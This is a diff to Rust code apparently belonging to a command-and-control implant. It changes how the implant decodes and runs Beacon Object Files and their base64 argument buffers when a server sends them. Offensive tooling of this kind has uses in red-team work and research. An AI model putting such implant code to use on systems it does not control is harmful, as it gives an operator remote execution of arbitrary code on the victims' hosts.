@@ -87,17 +87,23 @@ fn handle(msg: ServerMessage) -> ImplantMessage {
         ServerMessage::Hello => ImplantMessage::Hello {
             data: "hello from implant".to_string(),
         },
-        ServerMessage::Bof { file, args } => match decode_bof(&file) {
-            Err(e) => ImplantMessage::Error {
-                data: format!("decode bof: {e}"),
-            },
-            Ok(bytes) => match run_bof(&bytes, &args) {
+        ServerMessage::Bof { file, args } => {
+            let coff = match decode_bof(&file) {
+                Ok(b) => b,
+                Err(e) => {
+                    return ImplantMessage::Error { data: format!("decode bof: {e}") };
+                }
+            };
+            // `args` is base64-encoded raw BOF arg buffer (binary). Decode; an
+            // empty/missing args string is fine (some BOFs take none).
+            let args_bytes = decode_bof(&args).unwrap_or_default();
+            match run_bof(&coff, &args_bytes) {
                 Ok(output) => ImplantMessage::Output { data: output },
                 Err(e) => ImplantMessage::Error {
                     data: format!("run_bof: {e:#}"),
                 },
-            },
-        },
+            }
+        }
     }
 }
 
